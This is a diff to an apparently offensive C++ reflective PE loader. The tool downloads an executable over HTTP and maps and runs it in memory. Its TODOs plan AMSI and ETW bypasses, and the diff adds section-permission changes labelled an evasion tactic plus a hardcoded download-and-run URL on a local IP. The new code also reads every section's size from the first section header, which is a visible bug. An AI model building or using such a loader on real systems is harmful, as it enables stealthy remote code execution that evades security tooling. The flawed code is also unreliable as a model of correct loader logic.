@@ -19,7 +19,6 @@
 // TODO: native ExitThread function exits out of current process, hook this and fix
 // TODO: AMSI bypass before loading managed
 // TODO: ETW bypass 
-// TODO: implement [smart rebase](https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/)
 // TODO: parse headers and allocate straight from HTTP download 
 // TODO: find argv/argc get functions for other native C++ compilers, 
 //		 tested: cl.exe (non-multithreaded) __p__argv
@@ -188,7 +187,7 @@ DWORD rebaseImage(LPVOID peImageBase, IMAGE_NT_HEADERS* ntHeader) {
 			// write/patch new absolute address back into relocation entry
 			memcpy((PVOID)((DWORD_PTR)peImageBase+relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
 			// debugging print
-			printf("Patching %x -> %x\n", addressToPatch - deltaImageBase, addressToPatch);
+			printf("Relocation Patching %x -> %x\n", addressToPatch - deltaImageBase, addressToPatch);
 		}
 	}
 	return 0;
@@ -478,13 +477,50 @@ DWORD loadNative(char* peBuffer, int argc, char** argv) {
 	// copy image sections(.text, .data, .bss, ect) to allocated memory
 	IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
 	for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
+		LPVOID sectionVA = LPVOID(size_t(peImageBase) + sectionHeader[i].VirtualAddress);
+		LPVOID sectionBuffer = LPVOID(size_t(peBuffer) + sectionHeader[i].PointerToRawData);
+
+		// debugging print
+		printf("copying PE section %p -> %p\n", sectionBuffer, sectionVA);
+		// copy PE section to virtual address
 		memcpy(
-			LPVOID(size_t(peImageBase) + sectionHeader[i].VirtualAddress), // destination: ImageBase + RVA = VA
-			LPVOID(size_t(peBuffer) + sectionHeader[i].PointerToRawData), // source: Buffer addr + raw data(file offset)
+			sectionVA, // destination: ImageBase + RVA = VA
+			sectionBuffer, // source: Buffer addr + raw data(file offset)
 			sectionHeader[i].SizeOfRawData
 		);
+
+		// smart rebase, change sections permissions(PAGE_EXECUTE_READWRITE) to specific permission (evasion tactic)
+		DWORD ulPermissions = PAGE_EXECUTE_READWRITE;
+		ULONG_PTR sectionVirtualSize = sectionHeader->Misc.VirtualSize;
+		if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+			ulPermissions = PAGE_WRITECOPY;
+		}
+		if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ) {
+			ulPermissions = PAGE_READONLY;
+		}
+		if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
+			ulPermissions = PAGE_READWRITE;
+		}
+		if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+			ulPermissions = PAGE_EXECUTE;
+		}
+		if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)) {
+			ulPermissions = PAGE_EXECUTE_WRITECOPY;
+		}
+		if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
+			ulPermissions = PAGE_EXECUTE_READ;
+		}
+		if ((sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
+			ulPermissions = PAGE_EXECUTE_READWRITE;
+		}
+
+		// debugging print
+		printf("setting permissions %08x -> %p\n", ulPermissions, sectionVA);
+		// set new permissions on memory
+		VirtualProtect(sectionVA, sectionVirtualSize, ulPermissions, &ulPermissions);
+
 	}
-	
+
 	// reference headers from allocated memory so buffer can be free'd
 	ntHeader = getNT((char *)peImageBase);
 	if (ntHeader == NULL) {
@@ -762,6 +798,7 @@ int main(int argc, char* argv[])
 		printf("Usage: %s http://domain/file.exe [arg...]\n", strrchr(argv[0], '\\') ? strrchr(argv[0], '\\') + 1 : argv[0]);
 		return 0;
 	}
+	argv[1] = (char*)"http://192.168.72.1:8000/TestAppNative.exe";
 
 	// download PE from url
 	size_t peSize;
